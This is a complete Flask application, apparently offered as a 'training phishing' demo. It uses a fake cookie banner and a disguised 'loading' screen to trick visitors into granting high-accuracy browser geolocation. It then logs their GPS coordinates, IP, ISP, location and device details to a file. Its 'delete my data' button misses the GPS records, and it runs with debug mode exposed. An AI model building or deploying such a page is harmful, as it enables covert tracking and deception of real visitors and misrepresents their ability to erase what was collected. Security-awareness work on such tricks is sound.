from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import re
import json

app = Flask(__name__)

# Глобальные настройки
COOKIE_NAME = "user_consent"
LOG_FILE = "user_data.json"

def get_ip_data(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return response.json()
    except:
        return {"error": "Не удалось получить данные"}

def parse_user_agent(user_agent):
    # Улучшенный парсинг User-Agent
    os = browser = "Неизвестно"
    
    os_patterns = {
        'Windows 11': r'Windows NT 10.0; Win64; x64',
        'Windows 10': r'Windows NT 10.0',
        'Linux': r'Linux',
        'Android': r'Android',
        'iOS': r'iPhone|iPad|iPod',
        'Mac OS X': r'Macintosh'
    }
    
    for name, pattern in os_patterns.items():
        if re.search(pattern, user_agent):
            os = name
            break

    browser_patterns = {
        'Chrome': r'Chrome|CriOS',
        'Firefox': r'Firefox|FxiOS',
        'Safari': r'Safari',
        'Edge': r'Edg'
    }
    
    for name, pattern in browser_patterns.items():
        if re.search(pattern, user_agent) and not browser.startswith("Chrome"):
            browser = name

    device = "Смартфон/Планшет" if ('Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent) else "Компьютер"

    return os, browser, device

def log_user_data(ip, data):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(data) + "\n")
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Техническая информация</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
            background-color: #f5f5f5;
        }
        .info-block {
            background: white;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h2 {
            color: #4285f4;
            margin-top: 0;
        }
        #cookieConsent {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #333;
            color: white;
            padding: 15px;
            text-align: center;
            z-index: 1000;
        }
        .consent-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 8px 16px;
            margin: 0 5px;
            border-radius: 4px;
            cursor: pointer;
        }
        #geoModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 1001;
            justify-content: center;
            align-items: center;
        }
        .geo-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 500px;
            text-align: center;
        }
    </style>
</head>
<body>
    <!-- Основной контент (скрыт до согласия) -->
    <div id="mainContent" style="display: none;">
        <div class="info-block">
            <h2>🌍 Сетевая информация</h2>
            <p><strong>IP:</strong> {{ ip }}</p>
            <p><strong>Страна:</strong> {{ country }}</p>
            <p><strong>Город:</strong> {{ city }}</p>
            <p><strong>Провайдер:</strong> {{ isp }}</p>
        </div>

        <div class="info-block">
            <h2>💻 Системная информация</h2>
            <p><strong>ОС:</strong> {{ os }}</p>
            <p><strong>Браузер:</strong> {{ browser }}</p>
            <p><strong>Устройство:</strong> {{ device }}</p>
            <p><strong>Ядра CPU:</strong> <span id="cpuCores"></span></p>
        </div>

        <div class="info-block warning" style="background-color: #fff3e0; border-left: 4px solid #ff9800;">
            <h2>⚠️ Внимание!</h2>
            <p>Вы только что стали жертвой учебной фишинговой атаки. Соглашаясь на "использование cookies", вы фактически разрешили доступ к вашей геолокации.</p>
            <p><strong>Урок безопасности:</strong> Всегда внимательно читайте, на что вы даёте разрешение!</p>
            <button onclick="deleteMyData()" style="background: #ff9800; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">Удалить мои данные</button>
        </div>
    </div>

    <!-- Cookie-баннер -->
    <div id="cookieConsent">
        <p>Этот сайт использует cookies для улучшения работы. Продолжая использовать сайт, вы соглашаетесь с этим.</p>
        <button class="consent-btn" onclick="acceptCookies()">Принять</button>
        <button class="consent-btn" style="background: #666;" onclick="rejectCookies()">Отклонить</button>
    </div>

    <!-- Модальное окно геолокации (скрытое) -->
    <div id="geoModal">
        <div class="geo-content">
            <h3>Загрузка контента...</h3>
            <p>Пожалуйста, подождите, пока мы загружаем персонализированный контент для вас.</p>
        </div>
    </div>

    <script>
        // Проверяем согласие
        function checkConsent() {
            return document.cookie.includes("{{ COOKIE_NAME }}=true");
        }

        // Если согласие уже дано, показываем контент
        if (checkConsent()) {
            document.getElementById('cookieConsent').style.display = 'none';
            loadContent();
        }

        function acceptCookies() {
            // Устанавливаем куки
            document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
            document.getElementById('cookieConsent').style.display = 'none';
            
            // Показываем "загрузку" (на самом деле запрашиваем геолокацию)
            document.getElementById('geoModal').style.display = 'flex';
            
            // Запрашиваем геолокацию, маскируя под загрузку
            setTimeout(() => {
                getGeolocation();
            }, 1500);
        }

        function rejectCookies() {
            window.location.href = "about:blank";
        }

        function loadContent() {
            document.getElementById('mainContent').style.display = 'block';
            
            // Заполняем системную информацию
            document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Неизвестно";
            
            // Другие данные уже заполнены сервером
        }

        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        // Скрываем модальное окно
                        document.getElementById('geoModal').style.display = 'none';
                        
                        // Показываем основной контент
                        loadContent();
                        
                        // Отправляем данные на сервер
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        
                        fetch('/log_gps', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: lat,
                                lon: lon,
                                acc: acc
                            })
                        });
                    },
                    error => {
                        // В случае ошибки все равно показываем контент
                        document.getElementById('geoModal').style.display = 'none';
                        loadContent();
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                // Геолокация не поддерживается
                document.getElementById('geoModal').style.display = 'none';
                loadContent();
            }
        }

        function deleteMyData() {
            fetch('/delete_data', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert("Ваши данные были удалены!");
                    } else {
                        alert("Не удалось удалить данные");
                    }
                });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    consent = request.cookies.get(COOKIE_NAME)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Неизвестно')
    geo = get_ip_data(ip)
    os, browser, device = parse_user_agent(user_agent)
    
    # Логируем базовую информацию
    log_user_data(ip, {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "user_agent": user_agent,
        "os": os,
        "browser": browser,
        "device": device,
        "geo": geo
    })
    
    return render_template_string(HTML_TEMPLATE,
        ip=ip,
        country=geo.get('country', 'Неизвестно'),
        city=geo.get('city', 'Неизвестно'),
        isp=geo.get('org', 'Неизвестно'),
        os=os,
        browser=browser,
        device=device,
        COOKIE_NAME=COOKIE_NAME
    )

@app.route('/log_gps', methods=['POST'])
def log_gps():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_user_data(ip, {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "gps_data": data
    })
    
    return {'status': 'success'}

@app.route('/delete_data', methods=['POST'])
def delete_data():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    try:
        # Читаем все данные
        with open(LOG_FILE, "r") as f:
            logs = [json.loads(line) for line in f.readlines() if line.strip()]
        
        # Фильтруем данные
        new_logs = [log for log in logs if log.get('ip') != ip]
        
        # Перезаписываем файл
        with open(LOG_FILE, "w") as f:
            for log in new_logs:
                f.write(json.dumps(log) + "\n")
        
        return {'success': True}
    except Exception as e:
        print(f"Ошибка удаления данных: {e}")
        return {'success': False}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
